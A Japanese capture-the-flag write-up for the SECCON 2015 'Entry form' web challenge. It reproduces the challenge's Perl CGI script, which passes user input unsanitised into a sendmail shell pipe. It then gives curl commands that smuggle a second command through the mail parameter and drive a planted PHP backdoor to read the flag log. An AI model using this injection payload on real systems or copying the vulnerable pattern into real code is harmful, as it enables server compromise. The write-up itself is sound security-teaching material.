ルートディレクトリにアクセスするとディレクトリIndexがみれた。 スクリプトのコピーがあったので見てみると以下の様なコード。

```perl
#!/usr/bin/perl
# by KeigoYAMAZAKI, 2015.11.02-

use CGI;
my $q = new CGI;

print<<'EOM';
Content-Type: text/html; charset=utf-8

<html>
<head>
  <meta charset="utf-8">
  <title>SECCON 2015</title>
</head>
<body style='background:#000;color:#52d6eb;font-family:"ヒラギノ明朝 ProN W6", "HiraMinProN-W6", "HG明朝E", "ＭＳ Ｐ明朝", "MS PMincho", "MS 明朝", serif'>
<img src="logo.png">
<h2 style="text-align:center">SECURITY CONTEST 2015</h2>
<h1 style="font-size:28px;border-top:1px solid #28363D;border-bottom:1px solid #28363D;padding:15px">Entry Form</h1>
<form action="?" method="get"><pre>
EOM

if($q->param("mail") ne '' && $q->param("name") ne '') {
  open(SH, "|/usr/sbin/sendmail -bm '".$q->param("mail")."'");
  print SH "From: keigo.yamazaki\@seccon.jp\nTo: ".$q->param("mail")."\nSubject: from SECCON Entry Form\n\nWe received your entry.\n";
  close(SH);

  open(LOG, ">>log"); ### <-- FLAG HERE ###
  flock(LOG, 2);
  seek(LOG, 0, 2);
  print LOG "".$q->param("mail")."\t".$q->param("name")."\n";
  close(LOG);

  print "<h1>Your entry was sent. <a href='?' style='color:#52d6eb'>Go Back</a></h1>";
  exit;
}

print <<'EOM';
</pre><table border="0" style="margin:30px">
<tr><td>Your E-Mail address:</td><td><input type="email" name="mail" size="30" required></td></tr>
<tr><td>Your Name:</td><td><input type="text" name="name" size="30" required></td></tr>
<tr><td colspan="2"><input type="submit" name="action" value="Send" style="background-color:#52d6eb;border-style:none;padding:5px;margin:10px"></td></tr>
</table>
</form>
</body>
</html>
EOM

1;
```

logファイルを見れると正解っぽい。 最初は sendmail にログを添付させるのかなぁって思ったけど、どうやら sendmail動いていないらしい。パイプに繋いでやるとOSコマンドインジェクションができた。標準出力させるとHTMLとして表示されるのを発見。

`curl -i -X GET "http://entryform.pwn.seccon.jp/register.cgi?mail='%20|ls%20-l'&name=hoge&action=Send"`

こんな感じでcurlを叩くとOSコマンドインジェクションができ、ディレクトリがみれた。 SECRETディレクトリの中にbackdoor123.phpというのがあり、cmdパラメータにコマンドを入れると実行されるらしい。

`curl -i -X GET "http://entryform.pwn.seccon.jp/SECRET/backdoor123.php?cmd=head%20../log" でログの先頭を見ればOK。`

`SECCON{Glory_will_shine_on_you.}`

##### 参考
- [問題](https://github.com/SECCON/SECCON2015_online_CTF/tree/master/Web_Network/100_Entry%20form)
- SECCON2015 Online CTF writeup - http://blog.objc.jp/?p=2288
